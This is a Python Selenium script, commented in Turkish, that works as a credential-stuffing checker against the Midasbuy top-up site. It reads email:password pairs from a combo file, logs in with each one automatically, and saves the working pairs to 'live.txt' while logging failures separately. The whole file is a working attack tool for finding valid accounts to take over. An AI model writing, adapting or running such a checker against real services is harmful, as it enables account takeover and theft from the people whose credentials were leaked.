from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.edge.service import Service as EdgeService
from webdriver_manager.microsoft import EdgeChromiumDriverManager
import time

def login_to_midasbuy(email, password):
    try:
        service = EdgeService(EdgeChromiumDriverManager().install())
        driver = webdriver.Edge(service=service)

        driver.get('https://www.midasbuy.com/midasbuy/tr')

        time.sleep(5)
        
        login_button = driver.find_element(By.CSS_SELECTOR, 'div.MobileNav_sign_in__qA2oK')
        login_button.click()
        
        time.sleep(5)
        
        try:
            iframe = driver.find_element(By.ID, 'login-iframe')
            driver.switch_to.frame(iframe)
        except Exception as e:
            print("Iframe not found, proceeding without switching.")
        
        email_field = driver.find_element(By.CSS_SELECTOR, 'input[type="email"]')
        email_field.send_keys(email)
        

        continue_button = driver.find_element(By.CSS_SELECTOR, 'div.btn.comfirm-btn')
        continue_button.click()
        
        time.sleep(5)
        
        email_field_2 = driver.find_element(By.CSS_SELECTOR, 'input[name="type"]')
        email_field_2.send_keys(email)
        
        password_field = driver.find_element(By.CSS_SELECTOR, 'input[placeholder="Şifre gir"]')
        password_field.send_keys(password)
        
        login_button_2 = driver.find_element(By.CSS_SELECTOR, 'div.btn.comfirm-btn')
        login_button_2.click()
        
      
        time.sleep(10)  
        
    
        try:
           
            password_field = driver.find_element(By.CSS_SELECTOR, 'input[placeholder="Şifre gir"]')
        
            with open('offkanka.txt', 'a') as offkanka_file:
                offkanka_file.write(f'{email}:{password} - Giriş başarısız kontrol et\n')
        except:
           
            with open('live.txt', 'a') as live_file:
                live_file.write(f'{email}:{password}\n')
        
    
        driver.quit()
    except Exception as e:
        with open('dec.txt', 'a') as offkanka_file:
            offkanka_file.write(f'{email}:{password} - Error: {str(e)}\n')


with open('midasbuy.txt', 'r') as file:
    lines = file.readlines()
#hesasplar burdan alınıyor kanka ben deneme amacli yaptım.

for line in lines:
    email, password = line.strip().split(':')
    login_to_midasbuy(email, password)
# mail
# sifre
# mail
# sifre 
# böyle yapıyor bunu kendine göre ayarlarsın 

with open('bitti.txt', 'w') as bitti_file:
    bitti_file.write('Tüm hesaplar işlendi.\n')
